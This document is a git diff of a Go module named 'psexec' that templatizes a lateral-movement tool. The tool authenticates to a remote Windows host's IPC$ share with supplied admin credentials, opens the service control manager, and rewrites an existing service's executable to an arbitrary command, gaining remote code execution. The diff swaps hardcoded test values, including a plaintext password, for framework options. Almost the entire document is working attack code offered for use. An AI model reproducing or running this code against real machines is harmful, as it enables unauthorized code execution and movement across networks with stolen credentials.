@@ -1,18 +1,17 @@
 /*{
 Name: psexec
 Author: TerminalJockey
-Description: modifies service executable on target machine, and starts service gaining code execution.Requires valid admin creds.
-This is a POC, and will require modification, but if you know what you're doing it should be easy enough
+Description: modifies service executable on target machine, and starts service gaining code execution. Requires valid admin creds.
+Type:WinLocal
 Options:
-Lhost
-Lport
-Rhost
-Rport
-Username
-Password
-Domain
-<TBF>
-}*
+{
+	"Rhost":"",
+	"Username":"",
+	"Password":"",
+	"Domain":".",
+	"Cmd":""
+}
+}*/
 
 
 package main
@@ -45,7 +44,7 @@ func main() {
 	mpr := syscall.NewLazyDLL("mpr.dll")
 
 	//get connection to remote device
-	testval, _ := syscall.BytePtrFromString("\\\\DESKTOP\\C$")
+	testval, _ := syscall.BytePtrFromString("\\\\{{.Rhost}}\\IPC$")
 	netr := NETRESOURCE{
 		Scope:       1,
 		Type:        1,
@@ -58,8 +57,8 @@ func main() {
 	}
 
 	WNetAddConnection2A := mpr.NewProc("WNetAddConnection2A")
-	Uname := syscall.StringBytePtr(`.\Administrator`)
-	Passwd := syscall.StringBytePtr("tryhard")
+	Uname := syscall.StringBytePtr(`{{.Domain}}\{{.Username}}`)
+	Passwd := syscall.StringBytePtr("{{.Password}}")
 	ret, _, err := WNetAddConnection2A.Call(uintptr(unsafe.Pointer(&netr)), uintptr(unsafe.Pointer(Passwd)), uintptr(unsafe.Pointer(Uname)), 1)
 	if err != nil {
 		log.Println("initconn:", err)
@@ -79,7 +78,7 @@ func main() {
 	advapi32 := syscall.NewLazyDLL("advapi32.dll")
 
 	OpenScManagerW := advapi32.NewProc("OpenSCManagerW")
-	hostname := syscall.StringToUTF16Ptr(`DESKTOP`)
+	hostname := syscall.StringToUTF16Ptr(`{{.Hostname}}`)
 	svchandle, _, err := OpenScManagerW.Call(uintptr(unsafe.Pointer(hostname)), 0, 0xF003F)
 	if err != nil {
 		log.Println("OpenServiceManager:", err)
@@ -88,7 +87,7 @@ func main() {
 
 	OpenServiceW := advapi32.NewProc("OpenServiceW")
 
-	svcname := syscall.StringToUTF16Ptr("SensorDataService")
+	svcname := syscall.StringToUTF16Ptr("SensorService")
 	opencheck, _, err := OpenServiceW.Call(svchandle, uintptr(unsafe.Pointer(svcname)), 0xF003F)
 	if err != nil {
 		log.Println("openerr:", err)
@@ -99,9 +98,9 @@ func main() {
 	changeServiceConfig := advapi32.NewProc("ChangeServiceConfigA")
 
 	
-	newsvc := syscall.StringBytePtr("calc.exe")
-	lpServiceStartName := syscall.StringBytePtr(`.\Administrator`)
-	lpPasswd := syscall.StringBytePtr("tryhard")
+	newsvc := syscall.StringBytePtr("{{.Cmd}}")
+	lpServiceStartName := syscall.StringBytePtr(`{{.Domain}}\{{.Username}}`)
+	lpPasswd := syscall.StringBytePtr("{{.Password}}")
 
 	changecheck, _, err := changeServiceConfig.Call(opencheck, 0xFFFFFFFF, 3, 0, uintptr(unsafe.Pointer(newsvc)), uintptr(0), uintptr(0), uintptr(0), uintptr(unsafe.Pointer(lpServiceStartName)), uintptr(unsafe.Pointer(lpPasswd)), uintptr(0))
 	if err != nil {
